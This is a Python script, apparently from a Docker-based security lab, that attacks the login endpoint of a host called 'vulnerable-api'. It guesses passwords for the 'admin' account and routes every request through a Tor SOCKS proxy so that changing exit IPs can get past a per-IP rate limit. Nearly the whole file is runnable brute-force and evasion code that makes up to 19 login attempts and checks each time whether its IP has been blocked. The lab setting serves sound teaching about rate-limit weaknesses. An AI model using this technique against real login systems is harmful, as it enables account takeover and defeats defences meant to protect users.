#!/usr/bin/env python3
import requests
import time
import sys

# Instalación de dependencia si no existe (aunque el dockerfile ya lo incluye)
try:
    import socks
except ImportError:
    print("Se requiere 'requests[socks]'. Ejecuta: pip install requests[socks] PySocks")
    sys.exit(1)

TARGET_URL = "http://vulnerable-api:5000/api/login"
CHECK_IP_URL = "http://vulnerable-api:5000/api/check-ip"

# Configuración del Proxy (Tor)
PROXIES = {
    'http': 'socks5h://tor-proxy:9050',
    'https': 'socks5h://tor-proxy:9050'
}

def check_tor_ip():
    """Verifica qué IP está usando Tor actualmente"""
    try:
        r = requests.get(CHECK_IP_URL, proxies=PROXIES, timeout=10)
        data = r.json()
        print(f"[*] IP actual vía Tor: {data['ip']} (Bloqueada: {data['blocked']})")
        return data['ip']
    except Exception as e:
        print(f"[!] Error conectando a través de Tor: {e}")
        return None

def attack_with_rotation():
    print(f"[*] Iniciando ataque con ROTACIÓN DE IP vía Tor")
    print(f"[*] Proxy configurado: {PROXIES['http']}")
    
    current_ip = check_tor_ip()
    if not current_ip:
        print("[!] No se puede conectar al proxy Tor. Verifica que el contenedor 'tor-proxy' esté corriendo.")
        return

    # Intentamos realizar más peticiones de las que el bloqueo permite (limite es 5)
    for i in range(1, 20):
        try:
            payload = {
                "username": "admin",
                "password": f"password_tor_{i}"
            }
            
            # Realizamos la petición a través del proxy
            r = requests.post(TARGET_URL, json=payload, proxies=PROXIES, timeout=10)
            
            status = r.status_code
            
            if status == 429:
                print(f"[{i}] ⛔ IP Bloqueada ({current_ip}). Esperando rotación...")
                # En un escenario real con Tor, podríamos forzar nueva identidad o esperar
                # Aquí simplemente documentamos el hecho. 
                # Si el contenedor Tor rota rápido, la siguiente petición podría salir por otra IP.
                
                # Check ip again to see if it changed
                new_ip = check_tor_ip()
                if new_ip != current_ip:
                    print(f"[{i}] 🔄 ¡IP Rotada! Nueva IP: {new_ip}")
                    current_ip = new_ip
                else:
                    print(f"[{i}] La IP sigue siendo la misma. Tor rota cada ~10 min.")
            
            elif status == 401:
                print(f"[{i}] ✅ Intento fallido (200/401) - IP NO bloqueada. (API respondió: {r.json().get('error')})")
            
            else:
                print(f"[{i}] Status: {status}")

            # Pequeña pausa
            time.sleep(0.5)

        except Exception as e:
            print(f"[!] Error en intento {i}: {e}")

if __name__ == "__main__":
    attack_with_rotation()
